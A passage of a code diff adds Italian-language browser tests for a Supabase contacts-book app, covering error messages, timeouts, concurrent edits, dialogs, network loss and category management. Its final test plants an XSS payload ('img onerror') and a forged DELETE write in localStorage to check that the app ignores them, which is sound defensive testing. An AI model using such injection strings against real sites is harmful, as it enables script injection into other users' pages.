+          } finally { w.fetch = veraFetch; _sb.auth.refreshSession = veroRinnovo; }
+          var b = doc.getElementById('btnRiprova');
+          if (b) b.click(); else w.loadData(true);
+          if (!(await finche(function () { return schedaContatto(doc, A.id); }, 15000))) guai.push('dopo «Riprova» l\'elenco non torna');
+          return !guai.length || guai.join(' ‖ ');
+        });
+
+        // ── 16. il database non ha ancora la rubrica ──
+        await prova(S, 'se le tabelle della rubrica non esistono lo si dice con chiarezza (non si parla di connessione), con una sola richiesta e nessun rinnovo; «Nuovo Contatto» non si apre senza elenco', async function () {
+          var doc = w.document, veraFetch = w.fetch, veroRinnovo = _sb.auth.refreshSession, chiamate = 0, rinnovi = 0, guai = [];
+          _sb.auth.refreshSession = function () { rinnovi++; return _sb.auth.getSession(); };
+          w.fetch = function () {
+            chiamate++;
+            return Promise.resolve(new w.Response(JSON.stringify({ code: 'PGRST205', message: "Could not find the table 'public.rubrica_versione' in the schema cache" }), { status: 404, headers: { 'Content-Type': 'application/json' } }));
+          };
+          try {
+            await w.loadData(true);
+            var msg = doc.querySelector('#contactList .state-msg'), testo = msg ? msg.textContent.replace(/\s+/g, ' ') : '';
+            if (!msg || doc.querySelector('.contact-card')) guai.push('nessun messaggio, o contatti ancora in pagina');
+            if (testo.indexOf('non è ancora disponibile su questo sito') < 0) guai.push('il messaggio non dice che la rubrica non è ancora disponibile: «' + testo.slice(0, 120) + '»');
+            if (/connession/i.test(testo)) guai.push('il messaggio parla di connessione');
+            if (/schema cache|public\.|Could not|PGRST/i.test(testo)) guai.push('nel messaggio c\'è il testo del database');
+            if (!doc.getElementById('btnRiprova')) guai.push('manca «Riprova»');
+            if (doc.getElementById('chips').children.length) guai.push('le etichette delle categorie sono rimaste');
+            if (chiamate !== 1 || rinnovi !== 0) guai.push('richieste ' + chiamate + ' (attesa 1), rinnovi della sessione ' + rinnovi + ' (attesi 0)');
+            // senza elenco non ci sono categorie fra cui scegliere: il modulo non si apre
+            doc.getElementById('btnNew').click();
+            if (moduloAperto()) { guai.push('«Nuovo Contatto» si apre anche senza elenco caricato'); w.closeModal(); }
+          } finally { w.fetch = veraFetch; _sb.auth.refreshSession = veroRinnovo; }
+          var b = doc.getElementById('btnRiprova');
+          if (b) b.click(); else w.loadData(true);
+          if (!(await finche(function () { return schedaContatto(doc, A.id); }, 15000))) guai.push('dopo «Riprova» l\'elenco non torna');
+          return !guai.length || guai.join(' ‖ ');
+        });
+
+        // ── 17. la versione ──
+        await prova(S, 'chi usa l\'app non può scrivere la versione della rubrica (si manda il valore che c\'è già: se passasse non cambierebbe nulla)', async function () {
+          var ts = (await w.supaFetch('rubrica_versione?select=ts&id=eq.1'))[0].ts, e = null, r = null;
+          try { r = await w.supaFetch('rubrica_versione?id=eq.1', { method: 'PATCH', headers: { Prefer: 'return=representation' }, body: JSON.stringify({ ts: ts }) }); } catch (x) { e = x; }
+          if (e) return (e.stato === 403 || e.motivo === 'non-autorizzato') || ('la scrittura è stata respinta in modo inatteso (HTTP ' + e.stato + ', codice ' + e.codice + ')');
+          return (Array.isArray(r) && r.length === 0) || 'chi usa l\'app può scrivere la versione';
+        });
+
+        // ── 18. una richiesta che non riceve risposta ──
+        await prova(S, 'una richiesta che non riceve risposta viene interrotta dopo il tempo massimo (circa 12 secondi) e vale come rete assente: un salvataggio non resta appeso', async function () {
+          var veraFetch = w.fetch, conSegnale = false, e = null, t0 = Date.now();
+          // la richiesta NON parte: resta appesa finché la pagina non la interrompe
+          w.fetch = function (u, o) {
+            return new Promise(function (ok, ko) {
+              if (!o || !o.signal) return;
+              conSegnale = true;
+              o.signal.addEventListener('abort', function () { ko(new w.Error('interrotta')); });
+            });
+          };
+          try {
+            await Promise.race([
+              w.supaFetch('rubrica_contatti?id=eq.' + B.id, { method: 'PATCH', body: JSON.stringify({ note: 'mai inviata' }) }),
+              attendi(25000).then(function () { throw new Error('dopo 25 secondi la richiesta è ancora appesa'); })
+            ]);
+          } catch (x) { e = x; } finally { w.fetch = veraFetch; }
+          var durata = Date.now() - t0;
+          if (!conSegnale) return 'la richiesta parte senza il segnale d\'interruzione';
+          if (!e || !e.rete) return 'esito inatteso: ' + (e ? (e.motivo || e.message) : 'nessun errore');
+          return (durata > 9000 && durata < 18000) || ('interrotta dopo ' + Math.round(durata / 1000) + ' secondi (attesi circa 12)');
+        });
+
+        // ── 19. contatti dall'interfaccia ──
+        await prova(S, 'nuovo contatto, modifica ed eliminazione fatti dall\'interfaccia: una scrittura per volta, sempre e solo sul contatto di prova (filtro per identificativo)', async function () {
+          var doc = w.document, guai = [], nome = SEGNO_RUBRICA + " MODULO D'ORO & C.", idProva = null;
+          var s = salvagente(function (r) {
+            if (r.metodo === 'POST') return r.dove === 'rubrica_contatti' && !!r.corpo && diProva(r.corpo.nome);
+            return (r.metodo === 'PATCH' || r.metodo === 'DELETE') && idProva !== null && r.dove === 'rubrica_contatti?id=eq.' + idProva;
+          });
+          try {
+            // nuovo
+            doc.getElementById('btnNew').click();
+            if (!moduloAperto()) { guai.push('il modulo del contatto nuovo non si apre'); return esitoCon(s, guai); }
+            doc.getElementById('fNome').value = nome;
+            doc.getElementById('fCategoria').value = nomeCat;
+            var n = doc.querySelector('#numeriContainer .f-num');
+            n.value = '55 50-102'; n.dispatchEvent(new w.Event('input', { bubbles: true }));
+            doc.querySelector('#numeriContainer .f-nota').value = 'not|te';
+            doc.getElementById('btnSave').click();
+            var riga = await finche(async function () { return (await contattiColNome(nome))[0]; }, 12000);
+            if (!riga) { guai.push('il contatto nuovo non è arrivato nel database (avviso: «' + avviso().slice(0, 100) + '»)'); return esitoCon(s, guai); }
+            idProva = riga.id;
+            if (riga.numeri !== '5550102' || riga.note !== 'notte' || riga.categoria !== nomeCat) guai.push('la riga salvata non è quella scritta nel modulo (numeri ripuliti, nota senza barra, categoria scelta)');
+            if (s.scritture.length !== 1 || forma(s.scritture[0]) !== 'POST rubrica_contatti') guai.push('nuovo: scritture ' + s.scritture.map(forma).join(' , '));
+            if (!(await finche(function () { return !moduloAperto() && schedaContatto(doc, idProva); }, 12000))) { guai.push('il contatto nuovo non compare in elenco, o il modulo è rimasto aperto'); return esitoCon(s, guai); }
+            // modifica
+            if (!(await apriScheda(idProva))) { guai.push('la scheda del contatto nuovo non si apre'); return esitoCon(s, guai); }
+            doc.getElementById('fNome').value = nome + ' 2';
+            doc.getElementById('btnSave').click();
+            if (!(await finche(async function () { var x = await rigaDi('rubrica_contatti', idProva); return x && x.nome === nome + ' 2'; }, 12000))) guai.push('la modifica non è arrivata al contatto di prova (avviso: «' + avviso().slice(0, 100) + '»)');
+            if (s.scritture.length !== 2 || forma(s.scritture[1] || {}) !== 'PATCH rubrica_contatti?id=eq.' + idProva) guai.push('modifica: scritture ' + s.scritture.slice(1).map(forma).join(' , '));
+            else if (!uguali(s.scritture[1].corpo, { nome: nome + ' 2', categoria: nomeCat, numeri: '5550102', note: 'notte' })) guai.push('modifica: i dati inviati non sono quelli del modulo');
+            if (!(await finche(function () { var k = schedaContatto(doc, idProva); return !moduloAperto() && k && k.querySelector('.contact-name-text').textContent === nome + ' 2'; }, 12000))) { guai.push('il contatto modificato non compare in elenco'); return esitoCon(s, guai); }
+            // elimina
+            if (!(await apriScheda(idProva))) { guai.push('la scheda del contatto modificato non si apre'); return esitoCon(s, guai); }
+            doc.getElementById('btnDelete').click();
+            var si = await finche(conferma, 5000);
+            if (!si) { guai.push('la domanda «Eliminare questo contatto?» non compare'); return esitoCon(s, guai); }
+            si.click();
+            if (!(await finche(async function () { return !(await rigaDi('rubrica_contatti', idProva)); }, 12000))) guai.push('il contatto di prova non è stato eliminato');
+            if (s.scritture.length !== 3 || forma(s.scritture[2] || {}) !== 'DELETE rubrica_contatti?id=eq.' + idProva) guai.push('eliminazione: scritture ' + s.scritture.slice(2).map(forma).join(' , '));
+            if (!(await finche(function () { return !moduloAperto() && !schedaContatto(doc, idProva); }, 12000))) guai.push('dopo l\'eliminazione il contatto è ancora in elenco, o il modulo è rimasto aperto');
+          } finally { s.togli(); await chiudiTutto(); }
+          return esitoCon(s, guai);
+        });
+
+        // ── 20. due PC sullo stesso contatto ──
+        await prova(S, 'due PC sullo stesso contatto: la scheda si apre sui dati di adesso, e una modifica fatta altrove a scheda aperta non viene sovrascritta (lo si dice, senza scrivere)', async function () {
+          var doc = w.document, guai = [];
+          var P = await _q(_sb.from('rubrica_contatti').insert({ nome: SEGNO_RUBRICA + ' DUE PC', categoria: nomeCat, numeri: '5550201', note: '' }).select().single());
+          var s = salvagente(function (r) { return r.metodo === 'PATCH' && r.dove === 'rubrica_contatti?id=eq.' + P.id; });
+          try {
+            await w.loadData(true);
+            if (!(await finche(function () { return schedaContatto(doc, P.id); }, 12000))) { guai.push('il contatto di prova non compare in elenco'); return esitoCon(s, guai); }
+            // (a) un altro PC corregge il numero mentre qui il riquadro resta aperto: la scheda deve aprirsi sul numero nuovo
+            await attendi(1100);
+            await _q(_sb.from('rubrica_contatti').update({ numeri: '5550202' }).eq('id', P.id));
+            if (!(await apriScheda(P.id))) { guai.push('la scheda non si apre'); return esitoCon(s, guai); }
+            var visto = doc.querySelector('#numeriContainer .f-num').value;
+            if (visto !== '5550202') guai.push('la scheda si è aperta su una copia vecchia (numero «' + visto + '», atteso «5550202»): il controllo all\'apertura non ha visto la modifica fatta altrove');
+            // (b) a scheda aperta l'altro PC corregge ancora: qui si aggiunge una nota e si salva
+            await _q(_sb.from('rubrica_contatti').update({ numeri: '5550203' }).eq('id', P.id));
+            doc.querySelector('#numeriContainer .f-nota').value = 'nota scritta a scheda aperta';
+            doc.getElementById('btnSave').click();
+            if (!(await finche(function () { return !moduloAperto(); }, 12000))) guai.push('dopo il salvataggio rifiutato la scheda è rimasta aperta');
+            if (avviso().indexOf('modificato da un altro PC') < 0) guai.push('nessun avviso dice che il contatto è stato modificato da un altro PC (avviso: «' + avviso().slice(0, 100) + '»)');
+            await attendi(600);
+            if (s.scritture.length) guai.push('è partita una scrittura: ' + s.scritture.map(forma).join(' , '));
+            var dopo = await rigaDi('rubrica_contatti', P.id);
+            if (!dopo || dopo.numeri !== '5550203' || dopo.note !== '') guai.push('AGGIORNAMENTO PERSO: nel database il numero corretto dall\'altro PC è stato sovrascritto');
+          } finally { s.togli(); await chiudiTutto(); }
+          return esitoCon(s, guai);
+        });
+
+        // ── 21. una domanda rimasta a schermo ──
+        await prova(S, 'la domanda «Eliminare questo contatto?» non sopravvive alla sua scheda: chiusa la scheda (o premuto Esc) non può più eliminare nulla', async function () {
+          var doc = w.document, guai = [];
+          var s = salvagente(function () { return false; });   // qui non deve partire nessuna scrittura
+          try {
+            // scheda del contatto B, «Elimina», poi la scheda si chiude senza che nessuno abbia risposto alla domanda
+            if (!(await apriScheda(B.id))) { guai.push('la scheda non si apre'); return esitoCon(s, guai); }
+            doc.getElementById('btnDelete').click();
+            var si = await finche(conferma, 5000);
+            if (!si) { guai.push('la domanda non compare'); return esitoCon(s, guai); }
+            if ('inert' in doc.body && !doc.getElementById('modalOverlay').inert) guai.push('con la domanda a schermo la scheda sotto si può ancora toccare');
+            // (con la domanda a schermo il pulsante «Annulla» della scheda non si può premere: la si chiude come fa lui)
+            w.closeModal();
+            await attendi(300);
+            if (moduloAperto()) guai.push('la scheda non si è chiusa');
+            if (conferma()) guai.push('chiusa la scheda, la domanda è ancora a schermo');
+            // si apre un ALTRO contatto e si preme il «Conferma» rimasto
+            if (!(await apriScheda(A.id))) { guai.push('la seconda scheda non si apre'); return esitoCon(s, guai); }
+            si.click();
+            await attendi(900);
+            if (s.scritture.length || s.fermate.length) guai.push('il «Conferma» della domanda di prima ha fatto partire un\'eliminazione');
+            // Esc con la domanda a schermo: vale «Annulla» per la domanda, e la scheda resta
+            doc.getElementById('btnDelete').click();
+            var si2 = await finche(conferma, 5000);
+            if (!si2) guai.push('la seconda domanda non compare');
+            else {
+              doc.dispatchEvent(new w.KeyboardEvent('keydown', { key: 'Escape', bubbles: true }));
+              await attendi(300);
+              if (conferma()) guai.push('Esc non ha tolto la domanda');
+              if (!moduloAperto()) guai.push('Esc ha chiuso anche la scheda');
+              si2.click();
+              await attendi(900);
+              if (s.scritture.length || s.fermate.length) guai.push('dopo Esc il «Conferma» rimasto ha fatto partire un\'eliminazione');
+            }
+            if (!(await rigaDi('rubrica_contatti', A.id)) || !(await rigaDi('rubrica_contatti', B.id))) guai.push('un contatto di prova è stato eliminato');
+          } finally { s.togli(); await chiudiTutto(); }
+          return esitoCon(s, guai);
+        });
+
+        // ── 22. la rete cade durante un salvataggio ──
+        await prova(S, 'rete che cade durante un salvataggio: se la richiesta era arrivata non nasce un doppione, se non era arrivata si può riprovare senza perdere ciò che si è scritto', async function () {
+          var doc = w.document, guai = [], nome1 = SEGNO_RUBRICA + ' RISPOSTA PERSA', nome2 = SEGNO_RUBRICA + ' RETE ASSENTE', perdi = false, blocca = false;
+          var s = salvagente(function (r) { return r.metodo === 'POST' && r.dove === 'rubrica_contatti' && !!r.corpo && diProva(r.corpo.nome); });
+          // la richiesta parte e arriva, ma la risposta non torna
+          s.dopo = function (r, p) { if (!perdi) return p; perdi = false; return p.then(function () { throw new w.TypeError('risposta persa (finta)'); }); };
+          // la richiesta non parte nemmeno
+          s.alPosto = function () { if (!blocca) return null; blocca = false; return Promise.reject(new w.TypeError('rete assente (finta)')); };
+          function compila(nome, numero) {
+            doc.getElementById('btnNew').click();
+            if (!moduloAperto()) return false;
+            doc.getElementById('fNome').value = nome;
+            doc.getElementById('fCategoria').value = nomeCat;
+            var n = doc.querySelector('#numeriContainer .f-num');
+            n.value = numero; n.dispatchEvent(new w.Event('input', { bubbles: true }));
+            return true;
+          }
+          try {
+            // (a) arrivata, risposta persa
+            if (!compila(nome1, '5550401')) { guai.push('il modulo non si apre'); return esitoCon(s, guai); }
+            perdi = true;
+            doc.getElementById('btnSave').click();
+            if (!(await finche(function () { return !moduloAperto(); }, 20000))) {
+              guai.push('risposta persa: la scheda è rimasta aperta (avviso: «' + avviso().slice(0, 100) + '»)');
+              doc.getElementById('btnSave').click();    // ciò che farebbe chi legge «riprova»
+              await attendi(3000);
+            }
+            var quanti = (await contattiColNome(nome1)).length;
+            if (quanti !== 1) guai.push('risposta persa: nel database i contatti con quel nome sono ' + quanti + ' (atteso 1: DOPPIONE)');
+            await chiudiTutto();
+            // (b) mai arrivata
+            if (!compila(nome2, '5550402')) { guai.push('il modulo non si riapre'); return esitoCon(s, guai); }
+            blocca = true;
+            doc.getElementById('btnSave').click();
+            await finche(function () { return avviso().indexOf('non risulta salvato') >= 0; }, 20000);
+            if (!moduloAperto()) guai.push('rete assente: la scheda si è chiusa, e ciò che era scritto è perso');
+            else if (doc.getElementById('fNome').value !== nome2) guai.push('rete assente: il modulo non ha più ciò che era scritto');
+            if (avviso().indexOf('non risulta salvato') < 0) guai.push('rete assente: l\'avviso non dice che il contatto non risulta salvato (avviso: «' + avviso().slice(0, 100) + '»)');
+            if ((await contattiColNome(nome2)).length !== 0) guai.push('rete assente: il contatto è nel database senza che la richiesta sia partita');
+            if (moduloAperto()) {
+              doc.getElementById('btnSave').click();
+              if (!(await finche(async function () { return (await contattiColNome(nome2)).length === 1; }, 12000))) guai.push('rete tornata: il secondo «Salva» non ha salvato il contatto');
+              await finche(function () { return !moduloAperto(); }, 8000);
+            }
+          } finally { s.togli(); await chiudiTutto(); }
+          return esitoCon(s, guai);
+        });
+
+        // ── 23. categorie dall'interfaccia ──
+        var conLaFunzione = false;
+        await prova(S, 'categorie dall\'interfaccia: aggiunta, rinomina con i suoi contatti, riordino ed eliminazione, sempre e solo sulle categorie di prova', async function () {
+          var doc = w.document, guai = [], N1 = SEGNO_RUBRICA + ' NUOVA', N2 = SEGNO_RUBRICA + ' RINOMINATA', idDiProva = [CAT.id];
+          var s = salvagente(function (r) {
+            if (r.metodo === 'POST' && r.dove === 'rpc/rubrica_categorie_batch') {
+              var p = r.corpo;
+              if (!p || !Array.isArray(p.adds) || !Array.isArray(p.renames) || !Array.isArray(p.deletes)) return false;
+              var nomi = p.adds.concat(p.deletes, p.renames.map(function (x) { return x.old; }), p.renames.map(function (x) { return x['new']; }));
+              return nomi.length > 0 && nomi.every(diProva);
+            }
+            if (r.metodo === 'PATCH' && r.tabella === 'rubrica_categorie') {
+              var m = /^id=eq\.([0-9]+)$/.exec(r.filtro);
+              return !!m && idDiProva.indexOf(Number(m[1])) >= 0 && !!r.corpo && uguali(Object.keys(r.corpo), ['ordine']);
+            }
+            return false;
+          });
+          function batch() { return s.scritture.filter(function (r) { return r.tabella === 'rpc/rubrica_categorie_batch'; }).map(function (r) { return r.corpo; }); }
+          async function apri() { w.openCatModal(); return finche(function () { return doc.querySelector('#catList .cat-name-input'); }, 12000); }
+          async function salva() { doc.getElementById('btnCatSave').click(); }
+          function chiusa() { return finche(function () { return !categorieAperte(); }, 12000); }
+          // mai dare il fuoco ai campi dei nomi: all'uscita il nome verrebbe riscritto in forma «pulita» e diventerebbe una rinomina
+          function campoDi(nome) { return [].filter.call(doc.querySelectorAll('#catList .cat-name-input'), function (i) { return i.value === nome; })[0]; }
+          function rigaDelCampo(nome) { var c = campoDi(nome); return c ? c.closest('.cat-item') : null; }
+          try {
+            // aggiunta
+            if (!(await apri())) { guai.push('la finestra delle categorie non si apre'); return esitoCon(s, guai); }
+            doc.getElementById('fNewCat').value = 'prova-automatica nuova';
+            doc.getElementById('btnAddCat').click();
+            await salva();
+            if (!(await chiusa())) guai.push('aggiunta: la finestra non si chiude (avviso: «' + avviso().slice(0, 100) + '»)');
+            var K = (await _q(_sb.from('rubrica_categorie').select('*').eq('nome', N1)))[0];
+            if (!K) { guai.push('aggiunta: la categoria nuova non è nel database'); return esitoCon(s, guai); }
+            idDiProva.push(K.id);
+            if (!uguali(batch(), [{ adds: [N1], renames: [], deletes: [] }])) guai.push('aggiunta: chiamata diversa da quella attesa');
+            // rinomina di una categoria che ha un contatto: la domanda, poi una sola chiamata che aggiorna anche il contatto
+            var dentro = await _q(_sb.from('rubrica_contatti').insert({ nome: SEGNO_RUBRICA + ' IN CATEGORIA', categoria: N1, numeri: '3916', note: '' }).select().single());
+            await w.loadData(true);
+            await apri();
+            var campo = await finche(function () { return campoDi(N1); }, 8000);
+            if (!campo) { guai.push('rinomina: la categoria nuova non compare nella finestra'); return esitoCon(s, guai); }
+            if (campo.closest('.cat-item').querySelector('.cat-count').textContent.trim() !== '1 cont.') guai.push('rinomina: il conteggio dei contatti della categoria non è 1');
+            // con dei contatti la categoria non si elimina: il cestino avvisa e non segna nulla
+            campo.closest('.cat-item').querySelector('.cat-del-btn').click();
+            if (w.hasCatChanges()) guai.push('il cestino ha segnato per l\'eliminazione una categoria che ha contatti');
+            campo = campoDi(N1);
+            campo.value = N2; campo.dispatchEvent(new w.Event('input', { bubbles: true }));
+            await salva();
+            var si = await finche(conferma, 5000);
+            if (!si) guai.push('rinomina: la domanda sui contatti da aggiornare non compare');
+            else si.click();
+            if (!(await chiusa())) guai.push('rinomina: la finestra non si chiude (avviso: «' + avviso().slice(0, 100) + '»)');
+            var K2 = await rigaDi('rubrica_categorie', K.id), dentro2 = await rigaDi('rubrica_contatti', dentro.id);
+            if (!K2 || K2.nome !== N2) guai.push('rinomina: nel database la categoria non ha il nome nuovo');
+            if (!dentro2 || dentro2.categoria !== N2) guai.push('rinomina: il contatto della categoria non è stato aggiornato');
+            if (!uguali(batch().slice(1), [{ adds: [], renames: [{ old: N1, 'new': N2 }], deletes: [] }])) guai.push('rinomina: chiamata diversa da quella attesa');
+            // riordino: le due categorie di prova in fondo all'elenco si scambiano il posto
+            await _q(_sb.from('rubrica_categorie').update({ ordine: 9998 }).eq('id', K.id));
+            var tutte = await _q(_sb.from('rubrica_categorie').select('id,ordine'));
+            var valori = tutte.map(function (c) { return c.ordine; }), altre = tutte.filter(function (c) { return idDiProva.indexOf(c.id) < 0; });
+            if (valori.filter(function (v, i) { return valori.indexOf(v) !== i; }).length) guai.push('riordino NON provato: fra le categorie ci sono valori di «ordine» ripetuti (' + valori.length + ' categorie): il riordino li separerebbe toccando categorie non di prova');
+            else if (altre.some(function (c) { return c.ordine >= 9998; })) guai.push('riordino NON provato: una categoria non di prova ha un «ordine» da 9998 in su');
+            else {
+              await w.loadData(true);
+              await apri();
+              var rk = await finche(function () { return rigaDelCampo(N2); }, 8000), rc = rigaDelCampo(nomeCat);
+              if (!rk || !rc) guai.push('riordino: le due categorie di prova non compaiono nella finestra');
+              else {
+                var posto = function (r) { return [].indexOf.call(doc.querySelectorAll('#catList .cat-item'), r); };
+                var prima = posto(rigaDelCampo(N2)) < posto(rigaDelCampo(nomeCat));
+                // il trascinamento vero: maniglia della prima, puntatore sopra la seconda
+                try {
+                  var maniglia = rk.querySelector('.cat-drag-handle[data-drag]');
+                  rc.scrollIntoView({ block: 'center' });
+                  var q = rc.getBoundingClientRect(), dove = { bubbles: true, cancelable: true, pointerId: 7, clientX: Math.round(q.left + q.width / 2), clientY: Math.round(q.top + q.height / 2) };
+                  maniglia.dispatchEvent(new w.PointerEvent('pointerdown', dove));
+                  maniglia.dispatchEvent(new w.PointerEvent('pointermove', dove));
+                  maniglia.dispatchEvent(new w.PointerEvent('pointerup', dove));
+                } catch (e) {}
+                if ((posto(rigaDelCampo(N2)) < posto(rigaDelCampo(nomeCat))) === prima) {
+                  // qui gli eventi del puntatore non trovano la riga (pannello non in vista): si chiama la funzione che il trascinamento chiama
+                  conLaFunzione = true;
+                  w.scambiaPosti(Number(rigaDelCampo(N2).getAttribute('data-pidx')), Number(rigaDelCampo(nomeCat).getAttribute('data-pidx')));
+                }
+                if ((posto(rigaDelCampo(N2)) < posto(rigaDelCampo(nomeCat))) === prima) guai.push('riordino: le due categorie non si sono scambiate di posto nella finestra');
+                var primaDelSalvataggio = s.scritture.length;
+                await salva();
+                if (!(await chiusa())) guai.push('riordino: la finestra non si chiude (avviso: «' + avviso().slice(0, 100) + '»)');
+                var patch = s.scritture.slice(primaDelSalvataggio).map(function (r) { return forma(r) + ' ' + JSON.stringify(r.corpo); }).sort();
+                var attese = ['PATCH rubrica_categorie?id=eq.' + CAT.id + ' {"ordine":9998}', 'PATCH rubrica_categorie?id=eq.' + K.id + ' {"ordine":9999}'].sort();
+                if (!uguali(patch, attese)) guai.push('riordino: scritture ' + s.scritture.slice(primaDelSalvataggio).map(forma).join(' , ') + ' (attese due, una per categoria di prova)');
+                var o1 = await rigaDi('rubrica_categorie', CAT.id), o2 = await rigaDi('rubrica_categorie', K.id);
+                if (!o1 || !o2 || o1.ordine !== 9998 || o2.ordine !== 9999) guai.push('riordino: nel database l\'ordine non è quello scelto');
+              }
+            }
+            await chiudiTutto();
+            // eliminazione: la categoria deve essere vuota
+            await _q(_sb.from('rubrica_contatti').delete().eq('id', dentro.id));
+            await w.loadData(true);
+            await apri();
+            var daTogliere = await finche(function () { return rigaDelCampo(N2); }, 8000);
+            if (!daTogliere) guai.push('eliminazione: la categoria rinominata non compare nella finestra');
+            else {
+              var quanteChiamate = batch().length;
+              daTogliere.querySelector('.cat-del-btn').click();
+              await salva();
+              if (!(await chiusa())) guai.push('eliminazione: la finestra non si chiude (avviso: «' + avviso().slice(0, 100) + '»)');
+              if (await rigaDi('rubrica_categorie', K.id)) guai.push('eliminazione: la categoria è ancora nel database');
+              if (!uguali(batch().slice(quanteChiamate), [{ adds: [], renames: [], deletes: [N2] }])) guai.push('eliminazione: chiamata diversa da quella attesa');
+            }
+            if (batch().length !== 3) guai.push('chiamate alla funzione delle categorie: ' + batch().length + ' (attese 3: una aggiunta, una rinomina, una eliminazione)');
+          } finally { s.togli(); await chiudiTutto(); }
+          return esitoCon(s, guai);
+        });
+        // come è stato fatto il gesto del riordino lo dice il nome della prova
+        if (conLaFunzione) esiti[esiti.length - 1].nome += ' [riordino fatto chiamando la funzione del trascinamento: qui gli eventi del puntatore non trovano la riga, il gesto vero resta da provare a mano]';
+
+        // ── 24. la categoria è obbligatoria ──
+        await prova(S, 'un contatto senza categoria non ne riceve una di nascosto: il modulo chiede di sceglierla, e senza scelta non parte nulla', async function () {
+          var doc = w.document, guai = [];
+          var Z = await _q(_sb.from('rubrica_contatti').insert({ nome: SEGNO_RUBRICA + ' SENZA CATEGORIA', categoria: '', numeri: '5550301', note: '' }).select().single());
+          var s = salvagente(function (r) { return r.metodo === 'PATCH' && r.dove === 'rubrica_contatti?id=eq.' + Z.id; });
+          try {
+            await w.loadData(true);
+            if (!(await apriScheda(Z.id))) { guai.push('la scheda non si apre'); return esitoCon(s, guai); }
+            var sel = doc.getElementById('fCategoria');
+            if (sel.value !== '') guai.push('la scheda propone già una categoria al posto di quella vuota');
+            doc.getElementById('btnSave').click();
+            await attendi(900);
+            if (s.scritture.length) guai.push('senza categoria è partita una scrittura');
+            if (avviso().indexOf('Scegli una categoria') < 0) guai.push('nessun avviso chiede di scegliere la categoria (avviso: «' + avviso().slice(0, 100) + '»)');
+            if (!moduloAperto()) guai.push('la scheda si è chiusa senza salvare');
+            else {
+              sel.value = nomeCat;
+              doc.getElementById('btnSave').click();
+              if (!(await finche(async function () { var x = await rigaDi('rubrica_contatti', Z.id); return x && x.categoria === nomeCat; }, 12000))) guai.push('scelta la categoria, il contatto non viene salvato');
+              await finche(function () { return !moduloAperto(); }, 8000);
+            }
+          } finally { s.togli(); await chiudiTutto(); }
+          return esitoCon(s, guai);
+        });
+
+        // ── 25. uscita con un lavoro a metà nella rubrica ──
+        await prova(S, 'un contatto scritto e non salvato nella rubrica ferma «Esci»: l\'uscita non parte e l\'avviso nomina la rubrica', async function () {
+          var doc = w.document, guai = [], viste = [], veraFire = Swal.fire;
+          if (w.rubricaInSospeso()) guai.push('la rubrica si dice «in sospeso» senza nulla di aperto');
+          // nessuna finestra vera: si guarda che cosa l'app chiederebbe di mostrare. Una risposta «non confermato» non fa mai partire l'uscita.
+          Swal.fire = function (o) { viste.push(o || {}); return Promise.resolve({ isConfirmed: false }); };
+          try {
+            doc.getElementById('btnNew').click();
+            if (!moduloAperto()) { guai.push('il modulo non si apre'); return guai.join(' ‖ '); }
+            if (w.rubricaInSospeso()) guai.push('un modulo appena aperto e vuoto conta già come lavoro in sospeso');
+            doc.getElementById('fNome').value = SEGNO_RUBRICA + ' MAI SALVATO';
+            if (!w.rubricaInSospeso()) guai.push('la rubrica non dichiara il contatto scritto e non salvato');
+            window._esciSessione();
+            await attendi(300);
+            var titoli = viste.map(function (v) { return String(v.title || ''); });
+            if (titoli.some(function (x) { return /Uscire/.test(x); })) guai.push('«Esci» ha chiesto conferma: il lavoro a metà nella rubrica non lo ha fermato');
+            if (!titoli.some(function (x) { return x.indexOf('Rubrica') >= 0; })) guai.push('nessun avviso nomina la rubrica (finestre chieste: ' + titoli.map(function (x) { return x.slice(0, 40); }).join(' , ') + ')');
+            w.closeModal();
+            if (w.rubricaInSospeso()) guai.push('chiuso il modulo, la rubrica si dice ancora «in sospeso»');
+          } finally { Swal.fire = veraFire; await chiudiTutto(); }
+          if ((await contattiColNome(SEGNO_RUBRICA + ' MAI SALVATO')).length) guai.push('il contatto mai salvato è finito nel database');
+          return !guai.length || guai.join(' ‖ ');
+        });
+
+        // ── 26. memoria del browser ──
+        await prova(S, 'memoria del browser ostile: preferiti, tema e resti della rubrica di prima non diventano markup né richieste; nomi e numeri non restano sul disco, sotto nessuna chiave', async function () {
           window.__xss = [];
           var ostile = '1"><img src=x onerror="' + tracciaDaCornice('r-ls') + '">';
           localStorage.setItem('rubrica-preferiti', JSON.stringify([ostile, { a: 1 }, -5, 'abc', A.id, A.id]));
@@ -2038,6 +2632,9 @@
           localStorage.setItem('rubrica-ts', '1');
           localStorage.setItem('rubrica-pending-writes', JSON.stringify([{ path: 'consegne?letto=eq.NESSUN-LETTO-DI-PROVA', options: { method: 'DELETE' }, ts: 1, attempts: 0 }]));
           localStorage.setItem('rubrica-recent-searches', JSON.stringify([ostile]));
+          localStorage.setItem('rubrica-favs', JSON.stringify([ostile, B.id]));
+          localStorage.setItem('rubrica-recent-calls', ostile);
+          localStorage.setItem('rubrica-theme', ostile);
           var fr = await cornice('rubrica/?cb=' + Date.now());
           cornici.push(fr);
           var x = fr.contentWindow, doc = x.document;
@@ -2052,19 +2649,47 @@
           });
           if (['light', 'dark'].indexOf(doc.documentElement.getAttribute('data-theme')) < 0) guai.push('tema: «' + String(doc.documentElement.getAttribute('data-theme')).slice(0, 30) + '»');
           var stelle = doc.querySelectorAll('.contact-fav-star').length;
-          if (!card.querySelector('.contact-fav-star') || stelle !== 1) guai.push('preferiti disegnati: ' + stelle + ' (atteso solo il contatto di prova)');
-          RESIDUI.forEach(function (k) { if (localStorage.getItem(k) !== null) guai.push('la chiave ' + k + ' è rimasta sul dispositivo'); });
+          if (!card.querySelector('.contact-fav-star') || stelle !== 1) guai.push('preferiti disegnati: ' + stelle + ' (atteso solo il contatto di prova: i preferiti di adesso non si sostituiscono con quelli della rubrica di prima)');
+          RESIDUI.concat(DI_PRIMA).forEach(function (k) { if (localStorage.getItem(k) !== null) guai.push('la chiave ' + k + ' è rimasta sul dispositivo'); });
           var fuori = x.performance.getEntriesByType('resource').map(function (e) { return e.name; }).filter(function (u) { return /\/rest\/v1\//.test(u) && !/\/rest\/v1\/rubrica_/.test(u); });
           if (fuori.length) guai.push('richieste fuori dalla rubrica: ' + fuori.slice(0, 3).join(' , '));
-          for (var i = 0; i < localStorage.length; i++) {
-            var k = localStorage.key(i);
-            if (k.indexOf('rubrica-') === 0 && /PROVA-AUTOMATICA|5550199/.test(localStorage.getItem(k) || '')) guai.push('la chiave ' + k + ' contiene nomi o numeri');
-          }
